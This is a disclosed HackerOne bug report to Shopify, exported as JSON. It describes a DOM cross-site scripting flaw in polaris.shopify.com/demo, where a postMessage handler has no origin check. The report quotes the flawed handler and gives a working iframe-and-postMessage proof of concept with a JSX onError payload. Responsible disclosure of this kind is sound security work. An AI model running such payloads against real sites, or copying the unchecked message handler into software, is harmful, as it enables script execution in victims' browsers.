{
  "id": 894518,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84OTQ1MTg=",
  "url": "https://hackerone.com/reports/894518",
  "title": "xss on polaris.shopify.com/demo using postMessage",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "low",
  "readable_substate": "Resolved",
  "created_at": "2020-06-09T14:17:40.893Z",
  "submitted_at": "2020-06-09T14:17:40.893Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "coldd",
    "url": "/coldd",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/008/745/0bb2193777b619139b53b43279ff0be4f4cc75ed_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 1382,
    "url": "https://hackerone.com/shopify",
    "handle": "shopify",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Shopify",
      "twitter_handle": "",
      "website": "https://www.shopify.com",
      "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2021-02-11T19:09:45.982Z",
  "bug_reporter_agreed_on_going_public_at": "2021-02-08T16:40:06.044Z",
  "team_member_agreed_on_going_public_at": "2021-02-11T19:09:45.851Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "# Description\n\nit's possible to run arbitrary js code using https://polaris.shopify.com/demo + `postMessage`\n\nfollowing codes are from [this file](https://polaris.shopify.com/assets/baseline/demo-3801177f8c9e2fc96d7fbd9b73f76b32a8aa35fee26bee5aa0964e71955cf960.js) which formatted using [prettier](https://prettier.io/playground/)\n\n`Demo` component (line 381) uses `addEventListener` to listen for `message` events (line #401):\n\n```js\n          componentDidMount() {\n            window.addEventListener(\"message\", this.handleMessage),\n              this.throttledSendDetails(),\n              window.addEventListener(\"click\", handleAnchorClick);\n          }\n```\n\n`handleMessage` method (line #499) will set `data.ats` as component state without checking message origin:\n\n```js\n          handleMessage(e) {\n            var { data: t } = e;\n            console.log(e);\n            var r = Object(_app_utilities_ast__WEBPACK_IMPORTED_MODULE_61__.a)(\n              t.ast.code\n            );\n            t &&\n              Object.prototype.hasOwnProperty.call(t, \"ast\") &&\n              this.setState({\n                ast: r,\n                fullSizeExamples: t.fullSizeExamples,\n                omitAppProvider: t.omitAppProvider,\n              });\n          }\n```\n\n`ast.code` later rendered as React code.\n\n# Step to Reproduce\n\n1. create a HTML file containing an `iframe` with `https://polaris.shopify.com/demo` as `src`\n2. after iframe loaded, send a message with `{ast: {code: \"JSX code\"}}` as data\n\n```html\n    <iframe id=\"ifrm\" src=\"https://polaris.shopify.com/demo\" height=\"100%\" width=\"100%\" frameborder=\"0\"></iframe>\n    <script>\n      var ifrm = document.getElementById('ifrm');\n      ifrm.onload = function() {\n        ifrm.contentWindow.postMessage({ast: {\n          code: \"<img src='x' onError={() => alert(document.location)} />;\",\n        }}, '*');\n      }\n    </script>\n```\n\n# PoC\n\nhttp://209.141.43.59/shopify-xss.html\n\n## Impact\n\nattacker can use bug to run arbitrary js code in victims browser.",
  "weakness": {
    "id": 63,
    "name": "Cross-site Scripting (XSS) - DOM"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 860734,
      "file_name": "shopify-xss.html",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/qGRbkFiTySfWeKPF3E5xeUV3?response-content-disposition=attachment%3B%20filename%3D%22shopify-xss.html%22%3B%20filename%2A%3DUTF-8%27%27shopify-xss.html&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTPF4ZMYL%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T071218Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDzzbkCqsywccN8GLS7DwVyHNSiMlOga6HHW28IFriOOAIgTau0B4IslDSaYVvjTwMT2vMVAS%2BydaJOImvoD7WDRGQquwUI%2Fv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDKuAjAMYR7CxWomHryqPBTD7LUgho9FPqx9dXKQIsrIw%2BchghZqJIAEq%2FQ%2FOfPUJj2GdcVhHzBx8TqIn1RyIhrfd3DEShr3nEdCVT0%2FUZ1MHi8E10B629bN7kROPWrkmJZRK5rETZa97vpw9ZusPz0VDRyArkI1KdMvnF2rGp%2F4GtDskWHq126Po2aYRkUywjw6ofOmQfIDCPPhpbP%2BIvd%2BMTEx0vs5qD1JcEe2NUByPFtOHsh09VpDA%2BmLdMVLyb8R%2FGSDqBJkb11UKlJealBZZPnGi%2FGvj1K8dvUxJ8oAIsQMSZ4uF7fpvk5kppMzs%2BASgM%2Fd7ybpjwBujdx5d7XK%2FBkcRnHu7s694p716hsxc9xIaD%2FGXtLTtAlIM3VSWKcMvllggsg7eNAC5GlKqFhAn5v5%2BJZuQFGU8dkdjpLbvSx02jeQF0uYEd4raQ6JQnatqmxaAs4EFVnngIh1szs8WLwiiWpPdI6djAI%2FBQAZoDaqQoBoINZoKGskPUW328BPnT8zba7zr8ERCMfwNy7QzWcoyDCQvGOW8Snvm8mi249qQ9wZLOjCKHqJSy3uPy%2FCh6jper8QFttXG93p%2BL5c4yKBexpdiJ%2B6Nlup2x0m5ZkXIWGDKuTs%2BKGPZn%2Bw3jcxcnNHhhq1nX2TcrK9fjjgmBE7VIBn0yZAtVZpuBo%2FvgYLLifjRbBYo3C5JdsUD%2B3ksND8%2BF69Xx2t%2F7Z8JkbXdldYmiqYO01VI9qH9qVPB1LYyC%2BKWfnRrpMB6CvBbB4lWTIaawyZQVfzdGimvEbHMg2uNBRaVlrh%2FyPiUtLzmSFJ10ILoW5NtrtIu%2BOiOcBlik4aQsfACPWBAnLYCuy76W%2Fc%2BFQf2u3fZI1hrB5cFj0RLZ3D5KQ8Yl7%2F3nDowyP%2B9xgY6sQHwoEKGsXtk5DpjHDa6ZmqJOgp1LQX2F7OVZJ%2F65cR0bQD%2FDA3Wi%2BehvvGPbhbdL6P4Nr1f9kciXK9PDq7FrL%2Fp1opWVwh%2B4Q625BxgITNWDtkp7ZoIrpCwqQ6HlCq0kvHOcTyBhqw4N4VSV1LHO5QJNQJXOFkuHZJxBEwxgq3D0Oo3xFKmh9LAQeKMFzLbHYomU8vz0t3GGlkmAjn0nYEWv5ZPky%2B7XsEGo4DmAU2lhps%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e9bd2c50c264e5363cfc71d88c9c5f250b3313eb5f9670f17540f7f23e259605",
      "file_size": 603,
      "type": "text/html",
      "moderated": null
    },
    {
      "id": 860735,
      "file_name": "demo-3801177f8c9e2fc96d7fbd9b73f76b32a8aa35fee26bee5aa0964e71955cf960.js",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/2HaRpXJ7z8MfsccfWLNtYhkw?response-content-disposition=attachment%3B%20filename%3D%22demo-3801177f8c9e2fc96d7fbd9b73f76b32a8aa35fee26bee5aa0964e71955cf960.js%22%3B%20filename%2A%3DUTF-8%27%27demo-3801177f8c9e2fc96d7fbd9b73f76b32a8aa35fee26bee5aa0964e71955cf960.js&response-content-type=application%2Fx-perl&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTPF4ZMYL%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T071218Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDzzbkCqsywccN8GLS7DwVyHNSiMlOga6HHW28IFriOOAIgTau0B4IslDSaYVvjTwMT2vMVAS%2BydaJOImvoD7WDRGQquwUI%2Fv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDKuAjAMYR7CxWomHryqPBTD7LUgho9FPqx9dXKQIsrIw%2BchghZqJIAEq%2FQ%2FOfPUJj2GdcVhHzBx8TqIn1RyIhrfd3DEShr3nEdCVT0%2FUZ1MHi8E10B629bN7kROPWrkmJZRK5rETZa97vpw9ZusPz0VDRyArkI1KdMvnF2rGp%2F4GtDskWHq126Po2aYRkUywjw6ofOmQfIDCPPhpbP%2BIvd%2BMTEx0vs5qD1JcEe2NUByPFtOHsh09VpDA%2BmLdMVLyb8R%2FGSDqBJkb11UKlJealBZZPnGi%2FGvj1K8dvUxJ8oAIsQMSZ4uF7fpvk5kppMzs%2BASgM%2Fd7ybpjwBujdx5d7XK%2FBkcRnHu7s694p716hsxc9xIaD%2FGXtLTtAlIM3VSWKcMvllggsg7eNAC5GlKqFhAn5v5%2BJZuQFGU8dkdjpLbvSx02jeQF0uYEd4raQ6JQnatqmxaAs4EFVnngIh1szs8WLwiiWpPdI6djAI%2FBQAZoDaqQoBoINZoKGskPUW328BPnT8zba7zr8ERCMfwNy7QzWcoyDCQvGOW8Snvm8mi249qQ9wZLOjCKHqJSy3uPy%2FCh6jper8QFttXG93p%2BL5c4yKBexpdiJ%2B6Nlup2x0m5ZkXIWGDKuTs%2BKGPZn%2Bw3jcxcnNHhhq1nX2TcrK9fjjgmBE7VIBn0yZAtVZpuBo%2FvgYLLifjRbBYo3C5JdsUD%2B3ksND8%2BF69Xx2t%2F7Z8JkbXdldYmiqYO01VI9qH9qVPB1LYyC%2BKWfnRrpMB6CvBbB4lWTIaawyZQVfzdGimvEbHMg2uNBRaVlrh%2FyPiUtLzmSFJ10ILoW5NtrtIu%2BOiOcBlik4aQsfACPWBAnLYCuy76W%2Fc%2BFQf2u3fZI1hrB5cFj0RLZ3D5KQ8Yl7%2F3nDowyP%2B9xgY6sQHwoEKGsXtk5DpjHDa6ZmqJOgp1LQX2F7OVZJ%2F65cR0bQD%2FDA3Wi%2BehvvGPbhbdL6P4Nr1f9kciXK9PDq7FrL%2Fp1opWVwh%2B4Q625BxgITNWDtkp7ZoIrpCwqQ6HlCq0kvHOcTyBhqw4N4VSV1LHO5QJNQJXOFkuHZJxBEwxgq3D0Oo3xFKmh9LAQeKMFzLbHYomU8vz0t3GGlkmAjn0nYEWv5ZPky%2B7XsEGo4DmAU2lhps%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f7cc30f6cfad511c227ccb7420a62aba5c27e42884ba11adc4c41cb7b3faff9b",
      "file_size": 1965647,
      "type": "application/x-perl",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": null,
  "vote_count": 5,
  "voters": [
    "drsniper",
    "ali",
    "h4x0r_dz",
    "xsstestov",
    "rochdi1998"
  ],
  "severity": {
    "rating": "low",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 10202,
    "asset_type": "WILDCARD",
    "asset_identifier": "*.shopify.com",
    "max_severity": "medium"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
